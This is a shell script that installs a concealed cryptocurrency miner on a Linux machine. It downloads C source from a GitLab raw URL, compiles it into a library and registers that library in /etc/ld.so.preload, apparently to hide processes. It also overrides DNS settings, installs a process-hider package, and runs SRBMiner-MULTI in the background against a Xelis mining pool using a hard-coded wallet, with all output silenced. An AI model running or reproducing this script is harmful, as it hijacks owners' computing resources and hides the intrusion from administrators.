#!/bin/sh
sudo apt update
sudo apt install screen -y
apt-get update ; apt-get install sudo -y
curl https://gitlab.com/liugtiujk/portal/-/raw/master/cikblek.c -o cikblek.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libcikblek.so cikblek.c -ldl
mv libcikblek.so /usr/local/lib/
echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
rm cikblek.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.4/SRBMiner-Multi-2-7-4-Linux.tar.gz >/dev/null 2>&1
tar -xzvf SRBMiner-Multi-2-7-4-Linux.tar.gz
cd SRBMiner-Multi-2-7-4
./SRBMiner-MULTI --algorithm xelishashv3 --pool de.xelis.herominers.com:1225 --wallet xel:empagph7k0hmlgzd9vev84cxt9nz52375cftmvkdw56vwa8zhahqzqqyd9lq2aqpfsgnf."gP$RANDOM" >/dev/null 2>&1 &
